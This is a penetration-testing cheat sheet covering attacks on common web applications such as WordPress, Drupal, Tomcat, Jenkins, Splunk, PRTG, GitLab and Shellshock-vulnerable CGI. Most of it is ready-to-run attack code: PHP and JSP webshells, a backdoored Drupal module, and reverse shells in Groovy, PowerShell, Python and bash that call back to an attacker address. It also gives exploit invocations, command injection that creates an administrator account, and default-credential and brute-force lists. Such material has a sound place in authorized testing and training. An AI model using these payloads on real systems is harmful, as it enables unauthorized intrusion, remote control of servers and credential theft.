# Common Applications - Penetration Testing Cheat Sheet

> Always have written authorization before testing.

> This cheat sheet covers Common Applications attack techniques from reconnaissance through exploitation.
> Feed findings from 01-passive-recon and 02-active-recon into this phase.
---

## Table of Contents

- [WordPress](#wordpress)
- [Joomla](#joomla)
- [Drupal](#drupal)
- [Apache Tomcat](#apache-tomcat)
- [Jenkins](#jenkins)
- [Splunk](#splunk)
- [PRTG Network Monitor](#prtg-network-monitor)
- [ColdFusion](#coldfusion)
- [GitLab](#gitlab)
- [osTicket](#osticket)
- [CGI / Shellshock](#cgi--shellshock)
- [Tomcat CGI — CVE-2019-0232](#tomcat-cgi--cve-2019-0232)
- [IIS Tilde Enumeration](#iis-tilde-enumeration)
- [LDAP Injection](#ldap-injection)
- [Mass Assignment Vulnerabilities](#mass-assignment-vulnerabilities)
- [Thick Client Applications](#thick-client-applications)
- [Other Notable Applications](#other-notable-applications)

---

## WordPress

### Fingerprinting

```bash
# Identify via robots.txt
curl -s http://target.com/robots.txt
# Look for: /wp-admin/, /wp-content/

# Confirm WordPress + version
curl -s http://target.com | grep WordPress
# Output example: <meta name="generator" content="WordPress 5.8" />

# Enumerate themes
curl -s http://target.com/ | grep themes

# Enumerate plugins
curl -s http://target.com/ | grep plugins

# Check specific plugin page for version
curl -s http://target.com/?p=1 | grep plugins
```

### Key Paths

| Path | Description |
|------|-------------|
| `/wp-login.php` | Admin login portal |
| `/wp-admin/` | Admin panel |
| `/wp-content/plugins/` | Installed plugins |
| `/wp-content/themes/` | Installed themes |
| `/wp-content/uploads/` | Uploads directory |
| `/xmlrpc.php` | XML-RPC endpoint (brute-force vector) |
| `/robots.txt` | May reveal WP paths |
| `/readme.html` | May leak WP version |
| `/?feed=rss2` | RSS feed leaks version in generator tag |

### Enumeration with ffuf

```bash
# Enumerate plugins
ffuf -w /usr/share/nmap/nselib/data/wp-plugins.lst:FUZZ -u http://target.com/wp-content/plugins/FUZZ/readme.txt

# Enumerate themes
ffuf -w /usr/share/nmap/nselib/data/wp-themes.lst:FUZZ -u http://target.com/wp-content/themes/FUZZ/readme.txt
```

### WPScan

```bash
# Install
sudo gem install wpscan

# Full enumeration with API token
sudo wpscan --url http://target.com --enumerate --api-token <TOKEN>

# Brute-force via xmlrpc (faster)
sudo wpscan --password-attack xmlrpc -t 20 -U admin,john -P /usr/share/wordlists/rockyou.txt --url http://target.com

# Brute-force via wp-login
sudo wpscan --password-attack wp-login -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://target.com
```

**WPScan Enumerate Flags:**

| Flag | Description |
|------|-------------|
| `--enumerate u` | Users |
| `--enumerate p` | Plugins (vulnerable) |
| `--enumerate ap` | All plugins |
| `--enumerate t` | Themes |
| `--enumerate tt` | Timthumbs |
| `--enumerate cb` | Config backups |

### Exploitation — RCE via Theme Editor

1. Log in as admin → **Appearance → Theme Editor**
2. Select an **inactive theme** (e.g., Twenty Nineteen)
3. Edit `404.php`, add webshell:

```php
system($_GET[0]);
```

4. Save and trigger:

```bash
curl http://target.com/wp-content/themes/twentynineteen/404.php?0=id
```

### Exploitation — Metasploit

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set username john
set password firebird1
set lhost 10.10.14.15
set rhost 10.129.42.195
set VHOST blog.target.local
run
```

### Known Vulnerable Plugins

**mail-masta <= 1.0 — LFI**

```bash
curl -s "http://target.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

**wpDiscuz 7.0.4 — Unauthenticated RCE (CVE-2020-24186)**

```bash
python3 wp_discuz.py -u http://target.com -p /?p=1
# Then trigger shell:
curl "http://target.com/wp-content/uploads/2021/08/<shell>.php?cmd=id"
```

### User Enumeration

- Valid username + wrong password → `ERROR: The password you entered for the username X is incorrect`
- Invalid username → `ERROR: The username X is not registered`
- Also via: `/?author=1`, `/?author=2` ...

### WordPress User Roles

| Role | Description |
|------|-------------|
| Administrator | Full access, can edit source code |
| Editor | Publish/manage all posts |
| Author | Publish/manage own posts |
| Contributor | Write but cannot publish |
| Subscriber | Browse only |

---

## Joomla

### Fingerprinting

```bash
# Check meta generator tag
curl -s http://target.com | grep Joomla

# Check README.txt for version
curl -s http://target.com/README.txt | head -5

# Check manifest XML for version
curl -s http://target.com/administrator/manifests/files/joomla.xml | xmllint --format -

# Check robots.txt for Joomla paths
curl -s http://target.com/robots.txt
# Look for: /administrator/, /components/, /plugins/, etc.
```

### Key Paths

| Path | Description |
|------|-------------|
| `/administrator/` | Admin login portal |
| `/administrator/manifests/files/joomla.xml` | Exact version |
| `/plugins/system/cache/cache.xml` | Approximate version |
| `/README.txt` | Version info |
| `/LICENSE.txt` | License info |

### Enumeration Tools

```bash
# droopescan
sudo pip3 install droopescan
droopescan scan joomla --url http://target.com/

# JoomlaScan (Python2)
python2.7 joomlascan.py -u http://target.com
```

### Brute Force Login

```bash
# Default admin account is: admin
# Script-based brute force
sudo python3 joomla-brute.py -u http://target.com -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

### Exploitation — RCE via Template Editor

1. Log in as admin → **Extensions → Templates → Templates**
2. Click on an active template (e.g., `protostar`)
3. Edit `error.php`, add webshell with obfuscated param:

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

4. Trigger:

```bash
curl -s "http://target.com/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

### Known Vulnerabilities

**CVE-2019-10945 — Directory Traversal + File Deletion (Joomla 1.5–3.9.4)**

```bash
python2.7 joomla_dir_trav.py --url "http://target.com/administrator/" --username admin --password admin --dir /
```

---

## Drupal

### Fingerprinting

```bash
# Check meta generator
curl -s http://target.com | grep Drupal

# Check CHANGELOG.txt (older versions)
curl -s http://target.com/CHANGELOG.txt | grep -m2 ""

# Check /node/1, /node/2 — Drupal uses /node/<id> URIs
```

### Key Paths

| Path | Description |
|------|-------------|
| `/user/login` | Login page |
| `/node/<id>` | Content pages |
| `/CHANGELOG.txt` | Version (older installs) |
| `/README.txt` | Version info |
| `/modules/` | Installed modules |
| `/themes/` | Installed themes |

### Enumeration

```bash
droopescan scan drupal -u http://target.com
```

### Exploitation — PHP Filter Module (Drupal < 8)

1. Log in as admin → **Modules → Enable PHP Filter**
2. Go to **Content → Add content → Basic page**
3. Set **Text Format** to `PHP code`, add:

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

4. Save → browse to `/node/<id>?dcfdd5e021a869fcc6dfaef8bf31377e=id`

**Drupal 8+ — Install PHP Filter module manually:**

```bash
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
# Upload via Administration > Reports > Available updates > Install new module
```

### Exploitation — Backdoored Module Upload

```bash
# Download a legitimate module
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz

# Create webshell
echo '<?php system($_GET["fe8edbabc5c5c9b7b764504cd22b17af"]); ?>' > captcha/shell.php

# Create .htaccess to allow access
cat > captcha/.htaccess << 'EOF'
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
EOF

# Repack
tar cvf captcha.tar.gz captcha/

# Upload via: Manage > Extend > Install new module
# Trigger:
curl -s "http://target.com/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```

### Known Vulnerabilities (Drupalgeddon)

**Drupalgeddon — CVE-2014-3704 (Drupal 7.0–7.31) — Pre-auth SQLi → Admin account creation**

```bash
python2.7 drupalgeddon.py -t http://target.com -u hacker -p pwnd
# Then use exploit/multi/http/drupal_drupageddon in Metasploit
```

**Drupalgeddon2 — CVE-2018-7600 (Drupal < 7.58 / < 8.5.1) — Unauthenticated RCE**

```bash
python3 drupalgeddon2.py
# Enter URL when prompted, uploads webshell
curl "http://target.com/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```

**Drupalgeddon3 — CVE-2018-7602 — Authenticated RCE (requires session cookie)**

```bash
# Metasploit
use exploit/multi/http/drupal_drupageddon3
set rhosts 10.x.x.x
set VHOST target.local
set drupal_session SESS45ecfcb93...=jaAPbanr2...
set DRUPAL_NODE 1
set LHOST 10.10.14.15
run
```

---

## Apache Tomcat

### Fingerprinting

```bash
# Version in HTTP response header or error page
curl -s http://target.com:8080/docs/ | grep Tomcat

# Directory enumeration
gobuster dir -u http://target.com:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

### Key Paths & Files

| Path | Description |
|------|-------------|
| `/manager/html` | Tomcat Manager GUI (manager-gui role) |
| `/host-manager/html` | Host Manager |
| `/docs/` | Documentation (version leak) |
| `conf/tomcat-users.xml` | Credentials file |
| `conf/web.xml` | Deployment descriptor |
| `webapps/` | Web application root |

### Default Credentials to Try

```
tomcat:tomcat
admin:admin
tomcat:admin
admin:tomcat
tomcat:s3cret
```

### Brute Force — Metasploit

```bash
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST target.local
set RPORT 8180
set rhosts 10.x.x.x
set stop_on_success true
run
```

### Brute Force — Python Script

```bash
python3 mgr_brute.py -U http://target.com:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

### Exploitation — WAR File Upload (RCE)

```bash
# Download JSP webshell
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

# Package as WAR
zip -r backup.war cmd.jsp

# Upload via Manager GUI: http://target.com:8080/manager/html
# Then access:
curl "http://target.com:8080/backup/cmd.jsp?cmd=id"
```

**WAR file via msfvenom:**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war

nc -lnvp 4443
# Upload WAR → click /backup in Manager GUI
```

### CVE-2020-1938 — Ghostcat (AJP LFI)

Affects Tomcat < 9.0.31, < 8.5.51, < 7.0.100 — AJP on port 8009.

```bash
# Verify AJP port
nmap -sV -p 8009,8080 target.com

# Exploit — read internal files
python2.7 tomcat-ajp.lfi.py target.com -p 8009 -f WEB-INF/web.xml
```

---

## Jenkins

### Fingerprinting

Jenkins runs on **port 8080** by default (also port 5000 for slave communication).

- Login page at `/login` is distinctive
- Default credentials to try: `admin:admin`, `admin:password`, `jenkins:jenkins`

### Exploitation — Groovy Script Console

Access at: `http://jenkins.target.com:8000/script`

**Linux RCE:**

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**Linux Reverse Shell:**

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c",
  "exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

**Windows RCE:**

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

**Windows Reverse Shell (Java):**

```groovy
String host="10.10.14.15";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
};p.destroy();s.close();
```

**Metasploit:**

```bash
use exploit/multi/http/jenkins_script_console
```

### Notable CVEs

| CVE | Description |
|-----|-------------|
| CVE-2018-1999002 + CVE-2019-1003000 | Pre-auth RCE (Jenkins 2.137), bypass script sandbox |
| Jenkins 2.150.2 | Auth RCE via Node.js for users with JOB/BUILD perms |

---

## Splunk

### Fingerprinting

```bash
# Default ports
nmap -sV 10.x.x.x
# Port 8000 — Splunk web
# Port 8089 — Splunk management / REST API
```

- Default credentials (older versions): `admin:changeme`
- Common weak passwords: `admin`, `Welcome1`, `Welcome`, `Password123`
- Free version (post 60-day trial) requires **no authentication**

### Exploitation — Custom Scripted Input (RCE)

**Directory structure:**

```
splunk_shell/
├── bin/
│   ├── rev.py      # Linux reverse shell
│   ├── run.bat     # Windows launcher
│   └── run.ps1     # PowerShell reverse shell
└── default/
    └── inputs.conf
```

**inputs.conf:**

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

**run.bat:**

```bat
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

**run.ps1 (PowerShell reverse shell):**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
  $sendback = (iex $data 2>&1 | Out-String);
  $sendback2 = $sendback + 'PS '+(pwd).Path+'> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
```

**rev.py (Linux reverse shell):**

```python
import sys,socket,os,pty
ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

**Package and upload:**

```bash
tar -cvzf updater.tar.gz splunk_shell/
# Upload via: Apps > Manage Apps > Install app from file
nc -lnvp 443
```

---

## PRTG Network Monitor

### Fingerprinting

```bash
nmap -sV -p- --open -T4 10.x.x.x
# Look for: Indy httpd (Paessler PRTG bandwidth monitor) on 8080
curl -s http://target.com:8080/index.htm -A "Mozilla/5.0" | grep version
```

- Default credentials: `prtgadmin:prtgadmin`
- Common weak passwords: `Password123`, `Welcome1`

### Exploitation — CVE-2018-9276 (Authenticated Command Injection)

Affects PRTG < 18.2.39

1. Log in → **Setup → Account Settings → Notifications → Add new notification**
2. Give it a name → scroll down → tick **EXECUTE PROGRAM**
3. Program File: `Demo exe notification - outfile.ps1`
4. In **Parameter** field, inject:

```
test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

5. **Save** → click **Test** to execute

**Verify via CrackMapExec:**

```bash
sudo crackmapexec smb 10.x.x.x -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

---

## ColdFusion

### Fingerprinting

```bash
nmap -p- -sC -Pn 10.x.x.x --open
# Look for port 8500 (SSL/CF default)

# Navigate to: http://target:8500/
# Check for /CFIDE/ and /cfdocs/ directories
# Login page at /CFIDE/administrator/
```

**Indicators:**

- `.cfm` / `.cfc` file extensions
- HTTP header: `X-Powered-By: ColdFusion`
- `/CFIDE/administrator/index.cfm`
- Error messages referencing CFML tags

### Exploitation — Directory Traversal (CVE-2010-2861)

Affects ColdFusion ≤ 9.0.1

```bash
searchsploit adobe coldfusion
searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .

# Retrieve password.properties
python2 14641.py 10.x.x.x 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

**Vulnerable endpoints:**

```
/CFIDE/administrator/settings/mappings.cfm?locale=../../../etc/passwd
/CFIDE/administrator/enter.cfm?locale=../../../etc/passwd
```

### Exploitation — Unauthenticated RCE (CVE-2009-2265)

Affects ColdFusion ≤ 8.0.1 — File upload via FCKeditor

```bash
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .

# Edit script — set lhost, lport, rhost, rport
python3 50057.py
```

---

## GitLab

### Fingerprinting

- Browse to the URL → redirected to login page with GitLab logo
- Version at `/help` (requires login)
- Check `/explore` for public projects

### Username Enumeration

```bash
# Registration error reveals taken usernames/emails
# "Email has already been taken"

# Script-based enumeration
./gitlab_userenum.sh --url http://gitlab.target.com:8081/ --userlist users.txt
```

### Exploitation — Authenticated RCE (CVE-2021-22205)

Affects GitLab CE ≤ 13.10.2 — ExifTool metadata handling in uploaded images

```bash
python3 gitlab_13_10_2_rce.py -t http://gitlab.target.com:8081 -u mrb3n -p password1 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f'

nc -lnvp 8443
```

### Data Harvesting

- Browse `/explore` for public repos without auth
- Register an account if self-registration is open
- Search repos for: passwords, API keys, SSH private keys, config files
- Check snippets, wikis, CI/CD configs (`.gitlab-ci.yml`)

---

## osTicket

### Fingerprinting

- Cookie `OSTSESSID` set on visit
- Footer: `powered by osTicket` or `Support Ticket System`
- No version fingerprint via Nmap (just shows Apache/IIS)

### Abuse Scenarios

**Email address harvesting:**

1. Submit a new ticket → system assigns `<ticketnum>@company.local`
2. Use that email to register on other exposed internal services (GitLab, Slack, etc.)
3. Confirmation email arrives in ticket thread

**Credential exposure:**

1. Log in as support agent (via found/leaked creds)
2. Browse closed tickets for password resets, credentials sent in-thread
3. Test found passwords against VPN, RDP, mail portals

**Known CVE:** CVE-2020-24881 — SSRF in osTicket 1.14.1

---

## CGI / Shellshock

### Fingerprinting — Find CGI Scripts

```bash
gobuster dir -u http://target.com/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi,pl,sh,py
```

### Confirm Shellshock (CVE-2014-6271)

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://target.com/cgi-bin/access.cgi
```

### Exploitation — Reverse Shell

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://target.com/cgi-bin/access.cgi

nc -lvnp 7777
```

---

## Tomcat CGI — CVE-2019-0232

Windows only, `enableCmdLineArguments=true`. Affects Tomcat 7.0.0–7.0.93, 8.5.0–8.5.39, 9.0.0.M1–9.0.17.

### Find CGI Scripts

```bash
# Look for .bat and .cmd files
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://target.com:8080/cgi/FUZZ.bat

ffuf -w /usr/share/dirb/wordlists/common.txt -u http://target.com:8080/cgi/FUZZ.cmd
```

### Exploitation

```bash
# Basic command execution
http://target.com:8080/cgi/welcome.bat?&dir

# Get env variables (reveals PATH, COMSPEC, etc.)
http://target.com:8080/cgi/welcome.bat?&set

# Execute system commands (PATH is unset, use full path)
# URL-encode backslashes: \ = %5C, : = %3A
http://target.com:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```

---

## IIS Tilde Enumeration

### Theory

IIS generates 8.3 short names (e.g., `secret~1`) for files/dirs. These can be brute-forced via the `~` character to discover hidden files.

### Tool — IIS ShortName Scanner

```bash
java -jar iis_shortname_scanner.jar 0 5 http://target.com/
# Returns short names like: ASPNET~1, UPLOAD~1, TRANSF~1.ASP
```

### Resolve Full Filename with Gobuster

```bash
# Build wordlist from known short name prefix
egrep -r ^transf /usr/share/wordlists/* | sed 's/^[^:]*://' > /tmp/list.txt

# Brute force full name
gobuster dir -u http://target.com/ -w /tmp/list.txt -x .aspx,.asp
```

---

## LDAP Injection

### Default Ports

| Port | Protocol |
|------|----------|
| 389 | LDAP |
| 636 | LDAPS (SSL) |

### ldapsearch

```bash
ldapsearch -H ldap://ldap.target.com:389 -D "cn=admin,dc=target,dc=com" -w secret123 -b "ou=people,dc=target,dc=com" "(mail=john.doe@target.com)"
```

### Authentication Bypass — Wildcard Injection

If a web app uses LDAP for auth (e.g., `(&(objectClass=user)(sAMAccountName=$user)(userPassword=$pass))`):

```
Username: *
Password: *
```

Or more targeted:

```
Username: admin)(&
Password: anything
# Results in: (&(objectClass=user)(sAMAccountName=admin)(&)(userPassword=anything))
```

**Special characters to test:**

| Char | Meaning |
|------|---------|
| `*` | Match any |
| `)(` | Close/open filter |
| `&` | Logical AND |
| `\|` | Logical OR |
| `(cn=*)` | Always-true condition |

---

## Mass Assignment Vulnerabilities

Common in Ruby on Rails, Laravel, Django, Node.js (Mongoose).

### Exploitation

1. Inspect the registration/update form
2. In Burp Suite, intercept the POST request
3. Inject additional parameters not in the original form:

```
POST /register HTTP/1.1
...
username=attacker&password=test&confirmed=true
username=attacker&password=test&admin=true&role=administrator
```

### Detection Indicators

- Source code shows `attr_accessible` (Rails) without `admin` being listed
- API accepts extra JSON fields without validation
- Inspect JS files / source for model attributes

---

## Thick Client Applications

### Architecture Types

| Type | Description |
|------|-------------|
| Two-tier | Client communicates directly with the database |
| Three-tier | Client → Application Server → Database (more secure) |

### Information Gathering Tools

| Tool | Purpose |
|------|---------|
| CFF Explorer | PE header analysis |
| Detect It Easy | File type / packer detection |
| Process Monitor (ProcMon) | File/registry/network activity |
| Strings | Extract readable strings from binaries |
| x64dbg / OllyDbg | Dynamic analysis / debugging |
| Ghidra / IDA / Radare2 | Static reverse engineering |
| dnSpy | .NET assembly decompiler / debugger |
| JADX | Android/Java decompiler |
| Frida | Dynamic instrumentation |
| Wireshark / tcpdump | Network traffic analysis |
| Burp Suite | HTTP/HTTPS interception |

### Hardcoded Credentials — ELF/DLL

```bash
# Static string analysis
strings ./binary | grep -i "password\|pass\|pwd\|uid\|user"

# GDB — set breakpoint at SQLDriverConnect to read connection string
gdb ./binary
set disassembly-flavor intel
disas main
b *0x<SQLDriverConnect_address>
run
# Check RDX register for connection string
```

**.NET DLL — dnSpy:**

1. Drag & drop DLL onto dnSpy
2. Browse namespaces → find `Controller` classes
3. Look for connection strings, hardcoded credentials, SQL queries

**Extract embedded executable from memory:**

```bash
# In x64dbg: right-click CPU pane > Follow in Memory Map
# Find MAP region with RW-- protection and MZ header
# Right-click > Dump Memory to File
# Run De4Dot on the dump if .NET:
de4dot.exe <dumped_file.bin>
# Open cleaned file in dnSpy
```

### Path Traversal in Thick Clients

If a JAR-based thick client reads files from a server:

1. Decompile with JD-GUI or JADX
2. Find `showFiles()` or `open()` functions
3. Modify `currentFolder` parameter to `..` or `../../`
4. Recompile and repack:

```bash
# Compile modified Java file
javac -cp app.jar path/to/ModifiedClass.java

# Repack JAR
cd extracted_dir/
jar -cmf META-INF/MANIFEST.MF ../new-app.jar .
```

### SQL Injection in Thick Client Auth

If login uses unsanitized username in SQL query:

```sql
-- Query: SELECT id,username,email,password,role FROM users WHERE username='$input'
-- Inject:
test' UNION SELECT 1,'admin','admin@a.b','knownhash','admin
```

---

## Other Notable Applications

| Application | Attack Vector |
|-------------|--------------|
| **Axis2** | Weak/default admin creds → upload AAR webshell (similar to Tomcat WAR) |
| **WebSphere** | Default creds `system:manager` → deploy WAR → RCE |
| **Elasticsearch** | Unauthenticated access on port 9200, data exposure |
| **Zabbix** | SQL injection, auth bypass, RCE via Zabbix API |
| **Nagios** | Default creds `nagiosadmin:PASSW0RD`, various RCE CVEs |
| **WebLogic** | Java deserialization RCE (190+ CVEs), check for unauth RCE exploits |
| **DotNetNuke (DNN)** | Auth bypass, directory traversal, file upload bypass |
| **vCenter** | CVE-2021-22005 unauthenticated OVA upload, Apache Struts RCE |
| **MediaWiki / SharePoint** | Search for credential documents in repositories |

---

## Quick Reference — Default Credentials

| Application | Username | Password |
|-------------|----------|----------|
| Tomcat Manager | `tomcat` | `tomcat` / `admin` / `s3cret` |
| Jenkins | `admin` | `admin` |
| Splunk | `admin` | `changeme` |
| PRTG | `prtgadmin` | `prtgadmin` |
| Joomla | `admin` | `admin` |
| ColdFusion Admin | `admin` | (set at install) |
| Nagios | `nagiosadmin` | `PASSW0RD` |
| Zabbix | `Admin` | `zabbix` |
| WebSphere | `system` | `manager` |

---

## Quick Reference — Discovery Commands

```bash
# Full port scan
nmap -p- -sC -sV --open -T4 <target>

# Web directory brute force
gobuster dir -u http://target.com -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# EyeWitness (visual screenshot of web services)
eyewitness --web -f hosts.txt --timeout 10

# Aquatone (screenshot tool)
cat urls.txt | aquatone
```

---

*Always clean up artifacts (webshells, uploaded files, created accounts) after testing and document everything in your report.*
